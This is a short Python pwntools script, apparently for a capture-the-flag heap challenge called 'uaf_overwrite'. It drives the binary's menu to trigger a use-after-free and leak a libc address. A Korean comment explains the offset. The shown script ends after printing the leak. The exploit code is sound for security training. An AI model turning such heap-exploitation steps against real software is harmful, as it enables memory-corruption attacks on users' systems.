#!/usr/bin/python3
# Name: uaf_overwrite.py
from pwn import *
p = process("./uaf_overwrite")
def slog(sym, val): success(sym + ": " + hex(val))
def human(weight, age):
    p.sendlineafter(">", "1")
    p.sendlineafter(": ", str(weight))
    p.sendlineafter(": ", str(age))
def robot(weight):
    p.sendlineafter(">", "2")
    p.sendlineafter(": ", str(weight))
def custom(size, data, idx):
    p.sendlineafter(">", "3")
    p.sendlineafter(": ", str(size))
    p.sendafter(": ", data)
    p.sendlineafter(": ", str(idx))
# UAF to calculate the `libc_base`
custom(0x500, "AAAA", -1)
custom(0x500, "AAAA", -1)
custom(0x500, "AAAA", 0)
custom(0x500, "B", -1) # data 값이 "B"가 아니라 "C"가 된다면, offset은 0x3ebc42 가 아니라 0x3ebc43이 됩니다.

print(hex(u64(p.recvline()[:-1].ljust(8, b"\x00"))))